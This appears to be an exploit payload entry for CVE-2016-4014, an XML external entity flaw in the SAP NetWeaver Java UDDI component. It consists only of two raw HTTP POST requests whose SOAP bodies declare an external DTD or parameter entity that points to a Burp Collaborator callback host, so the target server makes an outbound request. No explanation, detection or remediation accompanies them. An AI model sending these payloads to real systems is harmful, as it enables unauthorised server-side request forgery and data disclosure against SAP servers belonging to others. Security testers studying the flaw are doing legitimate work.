<b>[CVE-2016-4014] SAP Netweaver JAVA AS UDDI Component XXE</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```
POST /uddi/api/replication HTTP/1.1
Host: host
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length: 340

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag PUBLIC "-//WHITE//NINJA//EN" "http://xyzabcdefhjkl.burpcollaborator.net/ssrf">
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header />
    <SOAP-ENV:Body>
        <do_ping>
            <authInfo />
            <findQualifiers>
                <findQualifier>FINDQUALIFIER</findQualifier>
            </findQualifiers>
            <tModelBag>
                <tModelKey>asd</tModelKey>
            </tModelBag>
        </do_ping>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

```
POST /uddi/api/replication HTTP/1.1
Host: host
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: text/xml;charset=UTF-8
SOAPAction:
Content-Length: 340

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE update [
<!ENTITY % external SYSTEM "http://xyzabcdefhjkl.burpcollaborator.net/">
%external;]>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header />
    <SOAP-ENV:Body>
        <do_ping>
            <authInfo />
            <findQualifiers>
                <findQualifier>FINDQUALIFIER</findQualifier>
            </findQualifiers>
            <tModelBag>
                <tModelKey>asd</tModelKey>
            </tModelBag>
        </do_ping>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
